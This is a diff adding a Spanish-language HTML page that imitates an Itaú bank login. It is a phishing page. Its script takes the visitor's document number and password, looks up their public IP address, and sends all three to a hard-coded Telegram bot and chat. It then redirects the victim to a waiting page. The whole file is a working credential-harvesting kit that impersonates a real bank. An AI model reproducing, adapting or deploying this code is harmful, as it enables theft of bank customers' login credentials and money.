@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ingreso de Usuario</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: start;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      padding: 40px 20px;
+    }
+
+    .logo {
+      height: 50px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    select {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+      appearance: none;
+      -webkit-appearance: none;
+      background-color: #fff;
+      background-image: url('data:image/svg+xml;utf8,<svg fill="gray" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 10px center;
+      background-size: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+    }
+
+    .password-container {
+      position: relative;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 45%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      width: 20px;
+      height: 20px;
+    }
+
+    .toggle-password img {
+      width: 100%;
+      height: 100%;
+      opacity: 0.6;
+    }
+
+    .toggle-password:hover img {
+      opacity: 1;
+    }
+
+    .link {
+      color: #007bff;
+      text-decoration: none;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background-color: #007bff;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="itau-logo.png" alt="Logo Itaú" class="logo" />
+    <h1>Ingresa tus datos</h1>
+
+    <label for="tipo">Tipo de documento</label>
+    <select id="tipo">
+      <option>Cédula de ciudadanía</option>
+      <option>Cédula de extranjería</option>
+      <option>Pasaporte</option>
+      <option>Pase diplomático</option>
+      <option>Registro civil</option>
+      <option>Tarjeta de identidad</option>
+    </select>
+
+    <label for="documento">Número de documento</label>
+    <input type="text" id="documento" placeholder="Ingresa número de documento" />
+
+    <label for="clave">Clave</label>
+    <div class="password-container">
+      <input type="password" id="clave" placeholder="Ingresa tu clave" />
+      <span class="toggle-password" onclick="togglePassword()">
+        <img id="eyeIcon" src="https://unpkg.com/heroicons@2.0.16/24/solid/eye.svg" alt="Mostrar" />
+      </span>
+    </div>
+
+    <a href="#" class="link">¿Tienes problemas con tu clave?</a>
+    <button class="btn" onclick="login()">Ingresar</button>
+  </div>
+
+  <script>
+    let showing = false;
+
+    function togglePassword() {
+      const input = document.getElementById("clave");
+      const icon = document.getElementById("eyeIcon");
+
+      if (input.type === "password") {
+        input.type = "text";
+        icon.src = "https://unpkg.com/heroicons@2.0.16/24/solid/eye-slash.svg";
+        icon.alt = "Ocultar";
+      } else {
+        input.type = "password";
+        icon.src = "https://unpkg.com/heroicons@2.0.16/24/solid/eye.svg";
+        icon.alt = "Mostrar";
+      }
+    }
+
+    // Obtener IP pública
+    var ipAddress = "";
+    fetch('https://api.ipify.org/?format=json')
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+      })
+      .catch(error => console.error("Error al obtener la IP:", error));
+
+    function login() {
+      const documento = document.getElementById('documento').value.trim();
+      const contrasena = document.getElementById('clave').value;
+
+      if (documento === "" || contrasena === "") {
+        alert("Por favor, rellene todos los campos.");
+        return;
+      }
+
+      if (contrasena.length < 5) {
+        alert("La contraseña debe tener mínimo 5 caracteres.");
+        return;
+      }
+
+      localStorage.setItem('documento', documento);
+      localStorage.setItem('contrasena', contrasena);
+
+      const chatId = '-4848157668';
+      const token = '8149566768:AAH7UtbprwvnPVj1aRvvzL1m8_pNPVMNP1Q';
+      const mensaje = `
+➖➖➖[ 𝙄𝙏𝘼𝙐 𝙐𝙔 ]➖➖➖ 
+✔️𝘿𝙤𝙘𝙪𝙢𝙚𝙣𝙩𝙤: <code>${documento}</code>
+✔️𝙋𝙖𝙨𝙨: <code>${contrasena}</code>
+✔️ IP: ${ipAddress}
+➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
+`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=HTML&text=${encodeURIComponent(mensaje)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            console.log('Mensaje enviado correctamente.');
+          } else {
+            console.error('Error al enviar el mensaje.', response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('Error en la solicitud:', error);
+        })
+        .finally(() => {
+          setTimeout(() => {
+            window.location.href = 'espera/index.html';
+          }, 500);
+        });
+    }
+  </script>
+</body>
+</html>
